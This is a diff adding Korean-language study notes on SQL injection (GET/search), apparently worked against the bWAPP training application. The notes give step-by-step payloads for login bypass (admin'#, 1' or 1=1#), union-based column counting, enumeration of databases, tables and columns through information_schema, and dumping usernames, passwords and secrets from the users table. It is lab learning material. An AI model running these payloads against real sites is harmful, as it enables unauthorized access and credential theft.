@@ -15,7 +15,115 @@ part2 - sql injection 공격
 
 
 ----------------------------------------------------------------------------------------------------------------------------------------------------------
-11강. Server-Side Included(SSI) Injection
+12강. SQL Injection(GET&Search)
+
+ GET 방식 : Header에 정보(변수)를 포함시킴, 그렇기 때문에 주소창(URL)에 서버로 넘어가는 정보가 보임
+
+
+
+
+
+*1.-----------
+공격 가능성 확인 mysqli_real_escape_string() 쓰지 않았다면 
+1.sql문을 거칠 것 같은 폼에 ' 을 입력한다.
+2.이런 오류가 났다면 이건 말도 안되게 취약한 웹이다.
+3.입력한 값이 바로 sql문으로 입력되는 구조로 '변수'으로 이루어져 있을 것이다.
+4.이 경우 # 또는 -- 주석을 이용하여 뒤의 쿼리문을 생략함으로써
+  아이디만 알아도 로그인이 가능하다.
+  admin'#
+
+
+1' or 1=1#
+위 쿼리문으로 모든 내용이 출력된다.
+
+
+
+
+
+
+*2.-----------
+이제 쿼리문의 구조를 알아낼 차례이다.
+
+'union' : 2개 이상의 Select 구문을 실행때 사용함
+을 사요와려 컬럼 개수를 파악하여 해당 컬럼에 맞는 sql문을 인젝션하여 정보를 확인할 수 있다
+
+---------------------------------
+database() : 데이터베이스 이름
+user() : 사용자 아이디
+system_user() : 관리자 권한 사용자 아이디
+table_name : 테이블 이름
+column_name : 컬럼 이름
+concat() : 문자열을 합쳐서 출력
+@@version : SQL 버전
+@@datadir : SQL 서버 디렉토리
+---------------------------------
+
+' union select all 1#
+' union select all 1,2#
+' union select all 1,2,3#
+' union select all 1,2,3,4#
+
+이런식으로 해당 된 문장이 작동할때까지 
+입력하여 컬럼의 수를 파악한다
+' union select all 1,2,3,4,5,6,7#
+' union select 1,2,3,4,5,6,7#
+
+위 결과 반응하여 나온것이
+2,3,5,4 이다.
+이로 인헤 반응한 숫자만이 쿼리문에 의해 출력되는 것이란걸 
+알 수 있다.
+
+
+
+
+
+*3.-----------
+이제 데이터 베이스를 알아보자
+
+
+' union select all 1,database(),user(),system_user(),@@version,6,7#
+
+데이터베이스 이름 , 사용자 아이디 , SQL 버전, 관리자 권한 사용자 아이디
+가 출력된다.
+
+1' union select 1,schema_name,3,4,5,6,7 from information_schema.schemata #
+이렇게 하면 위 서버의 모든 데이터 베이스가 나온다.
+
+
+
+
+
+
+
+*4.-----------
+이제 테이블의 이름을 알아보자
+1' union select 1,table_name,3,4,5,6,7 from information_schema.tables #
+위 서버의 모든 테이블이 나오게 된다.
+
+위에서 알아낸 정보로 테이블을 간추리자
+1' union select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema = 'bWAPP'#
+
+
+
+
+blog	
+heroes	
+movies	
+users	
+visitors
+
+이렇게 나오게 되는데
+
+
+
+
+
+
+*5.-----------
+테이블의 컬럼을 파악하자
+1' union select all 1,column_name,3,4,5,6,7 from information_schema.columns where table_name = 'users'#
+
+1' union select 1,table_name,column_name,3,4,5,6 from information_schema.columns where table_schema = 'bWAPP' and table_name = 'users'#
 
 
 
@@ -24,6 +132,20 @@ part2 - sql injection 공격
 
 
 
+*6.-----------
+테이블의 컬럼의 내용을 확인하자
+간단하게는 이렇게
+5' UNION SELECT 1,login,password,email,4,admin,6 FROM bWAPP.users#
+
+정보의 효율을 높이자면
+concat() : 문자열을 합쳐서 출력
+을 이용하여 쿼리문을 만들면 컬럼의 제한은 해결할 수 있따
+
+
+5' UNION SELECT all 1,concat(id,login),password,email,secret,6,7 FROM users#
+
+다만 위 경우 html 에 의도되지 않은 정보의 양을 쑤셔넣은 격이라 보기에 불편하다.
+페이지 소스보기로 보면 좀 더 가시성을 높여서 정보를 볼수 있다
 
 
 ----------------------------------------------------------------------------------------------------------------------------------------------------------
